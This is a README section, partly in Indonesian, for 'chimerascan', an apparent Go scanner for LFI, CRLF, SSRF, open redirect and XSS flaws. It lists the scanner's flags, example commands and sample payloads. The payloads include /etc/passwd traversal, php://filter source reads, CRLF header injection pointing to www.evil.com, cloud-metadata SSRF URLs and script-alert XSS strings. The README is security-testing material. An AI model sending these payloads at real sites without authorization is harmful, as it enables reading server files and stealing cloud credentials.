<h2 align="center">📖 Usage</h2>

### 🎚️ Flags

<div align="center">

| 🏴 Flag | 📝 Description | ⚙️ Default |
|:-------:|:---------------|:----------:|
| `-u <url>` | Single target base URL | — |
| `-l <file>` | File with list of base URLs | — |
| `-tags <list>` | Modules: `lfi`, `crlf`, `ssrf`, `openredirect`, `xss` | all |
| `-fuzz` | Enable fuzzing (replace `FUZZ` placeholder) | `false` |
| `-hit <n>` | Stop after N findings. `0` = scan all payloads | `0` |
| `-poc` | Save hitting URLs to `poc.txt` | `false` |
| `-o <file>` | Save findings to JSON | — |
| `-X <method>` | HTTP method | `GET` |
| `-d <body>` | Request body (may contain `FUZZ`) | — |
| `-H <header>` | Custom header `"Name: value"` (repeatable) | — |
| `-T <n>` | Concurrent threads | `20` |
| `-timeout <n>` | Request timeout in seconds | `15` |
| `-v` | Verbose output | `false` |
| `-ua <file>` | User-Agent list file | `Ua.txt` |
| `-ua-random` | Random UA per request (default: round-robin) | `false` |

</div>

## 🎯 Hit Limit Behaviour

Fitur penting untuk efisiensi scanning — **kapan harus berhenti?**

| Command | Behaviour |
|---------|-----------|
| *(tanpa `-hit`)* | 🔁 Scan **SEMUA** payload sampai habis |
| `-hit=1` | 🛑 Stop setelah **1** vuln ketemu (paling cepat) |
| `-hit=2` | 🛑 Stop setelah **2** vuln ketemu |
| `-hit=10` | 🛑 Stop setelah **10** vuln ketemu |
| `-hit=0` | 🔁 Sama dengan tanpa `-hit` (unlimited) |

**Contoh:**
```bash
# Cari 3 vuln, lalu stop
./chimerascan -u "https://example.com/?q=FUZZ" -tags xss,lfi -fuzz -hit=3

# Full enumeration (default) — semua payload dites
./chimerascan -u "https://example.com/?q=FUZZ" -tags xss -fuzz

# Test satu payload saja per modul
./chimerascan -u "https://example.com/?q=FUZZ" -tags xss -fuzz -hit=1
```

<h2 align="center">🧪 Examples</h2>

### 🐉 LFI Fuzzing

```bash
./chimerascan -u "https://example.com/?file=FUZZ" -tags lfi -fuzz
```

### 🐉 LFI No-Fuzz

```bash
./chimerascan -u https://example.com -tags lfi
```

### 🐉 CRLF Injection

```bash
./chimerascan -u https://example.com -tags crlf
```

### 🐉 SSRF Fuzzing

```bash
./chimerascan -u "https://example.com/?url=FUZZ" -tags ssrf -fuzz
```

### 🐉 Open Redirect Fuzzing

```bash
./chimerascan -u "https://example.com/?next=FUZZ" -tags openredirect -fuzz
```

### 🐉 XSS Fuzzing (fuzz only)

```bash
./chimerascan -u "https://example.com/?q=FUZZ" -tags xss -fuzz
```

### 🐉 Combined — All Outputs

```bash
./chimerascan -u https://example.com \
    -tags lfi,ssrf,openredirect,xss \
    -fuzz \
    -T 30 \
    -hit 5 \
    -poc \
    -o findings.json
```

### 🐉 POST Request with Custom Headers

```bash
./chimerascan -u "https://example.com/api/read" \
    -tags lfi \
    -fuzz \
    -X POST \
    -d "file=FUZZ" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=abc123"
```

### 🐉 Multiple Targets

`urls.txt`:
```
https://target1.example.com
https://target2.example.com
https://target3.example.com
```

```bash
./chimerascan -l urls.txt -tags lfi,ssrf,xss -fuzz -T 30 -hit 3 -poc
```

<h2 align="center">📂 Payload Files</h2>

Payloads are plain text — one entry per line. Lines starting with `#` are comments.

### `lfi/fuzzing/payload.txt` — Payload only

```
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=index.php
```

### `lfi/nofuzz/payload.txt` — Full path/query

```
/?file=../../../../etc/passwd
/?file=php://filter/convert.base64-encode/resource=index.php
```

### `crlf/payload.txt`

```
/%0d%0aSet-Cookie:coffin=hi
/%0aSet-Cookie:coffin=hi
/%0d%0aLocation: www.evil.com
```

### `ssrf/fuzzing/payload.txt` — URL only

```
http://127.0.0.1/
http://169.254.169.254/latest/meta-data/
```

### `ssrf/nofuzz/payload.txt`

```
/?url=http://127.0.0.1/
/?url=http://169.254.169.254/latest/meta-data/
```

### `openredirect/fuzzing/payload.txt` — URL only

```
https://bing.com
//bing.com
%2F%2Fbing.com
```

### `openredirect/nofuzz/payload.txt`

```
/?next=https://bing.com
/?url=https://bing.com
/?redirect=https://bing.com
```

### `xss/fuzzing/payload.txt` — Payload only

```
<script>alert(1)</script>
"><script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
```

```

Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ... Safari/605.1.15
```

<h2 align="center">🎯 Detection Signatures</h2>

<div align="center">

<table>
<tr>
<td width="33%" valign="top">

### 🐉 LFI
<sub>scans **response body**</sub>

- Linux `/etc/passwd` markers
- Windows `win.ini`, `boot.ini`
- PHP wrapper base64 (`PD9waHA`)
- Linux kernel banner
- SSH private keys
- `/proc/self/environ`

</td>
<td width="33%" valign="top">

### 💉 CRLF
<sub>scans **response headers**</sub>

- `Location: www.evil.com`
- `Set-Cookie: coffin=hi`
- `coffin-x: coffin-x`
- Status must be `2xx` or `3xx`

</td>
<td width="33%" valign="top">

### 🌐 SSRF
<sub>scans **response body**</sub>

- AWS/GCP/Azure metadata
- Alibaba/DigitalOcean metadata
- Internal service banners
- Redis / Memcached info

</td>
</tr>
<tr>
<td width="33%" valign="top">

### 🔗 Open Redirect
<sub>scans **response headers**</sub>

- Status `301/302/303/307/308`
- `Location: https://bing.com`
- Marker-based detection

</td>
<td width="33%" valign="top">

### ⚡ XSS
<sub>scans **response body**</sub>

- Raw reflection of the payload
- Payload appears unencoded
- **Manual verification required** for confirmation

</td>
<td width="33%" valign="top">

### 🎭 UA Rotation

- `Ua.txt` — one UA per line
- Round-robin (default)
- Random mode (`-ua-random`)
- Override via `-H "User-Agent:..."`

</td>
</tr>
</table>

<h2 align="center">🛠️ Customization</h2>

### ➕ Add New Payloads

```bash
echo "../../../../etc/hosts" >> lfi/fuzzing/payload.txt
```

### ➕ Add New Signatures

Edit the signature arrays in `main.go`:

```go
var lfiSignatures = []Signature{
    {"passwd-root", regexp.MustCompile(`root:[^:]*:0:0:`)},
    {"my-signature", regexp.MustCompile(`my-pattern`)},   // add yours
}
```

Then rebuild:

```bash
go build -o chimerascan .
```

### ➕ Add a New Module

1. Create folder (e.g., `xxe/fuzzing/payload.txt`)
2. Add scanner function (mirror `scanXSSFuzz`)
3. Register new tag in `parseTags` + `main.go`
